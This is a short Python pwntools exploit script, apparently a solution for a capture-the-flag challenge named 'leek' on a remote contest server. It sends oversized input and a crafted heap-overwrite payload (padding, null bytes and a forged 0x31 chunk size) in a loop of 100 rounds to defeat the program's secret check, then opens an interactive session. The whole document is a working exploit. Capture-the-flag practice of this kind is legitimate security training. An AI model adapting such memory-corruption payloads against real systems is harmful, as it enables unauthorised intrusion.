from pwn import *

context.log_level = 'DEBUG'
# elf = context.binary = ELF('./leek')

# p = process('./leek')
p = remote('challs.actf.co', '31310')

for i in range(100):
    payload = b'a' * 0x3f
    p.sendlineafter(b'Your input (NO STACK BUFFER OVERFLOWS!!): ', payload)
    p.sendafter(b'So? What\'s my secret? ', b'a' * 0x1f + b'\n')

    payload = b'a' * 0x10 + b'\0' * 8 + p64(0x31) + b'\0' * 0x20
    p.sendlineafter(b'Say what you want: ', payload)

p.interactive()